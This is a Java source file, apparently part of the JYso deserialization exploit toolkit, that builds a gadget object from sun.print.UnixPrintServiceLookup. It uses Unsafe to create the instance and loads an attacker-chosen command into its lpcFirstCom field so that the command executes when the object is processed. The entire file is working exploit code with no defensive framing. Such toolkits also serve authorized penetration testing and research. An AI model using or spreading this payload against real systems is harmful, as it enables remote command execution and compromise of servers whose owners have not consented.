package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import sun.misc.Unsafe;

import java.lang.reflect.Field;

@SuppressWarnings({"unused"})
public class UnixPrintServiceLookup implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object unixPrintServiceLookup = unsafe.allocateInstance(Class.forName("sun.print.UnixPrintServiceLookup"));
        Reflections.setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
        Reflections.setFieldValue(unixPrintServiceLookup, "osname", "xx");
        Reflections.setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{command, command, command});
        return unixPrintServiceLookup;
    }
}
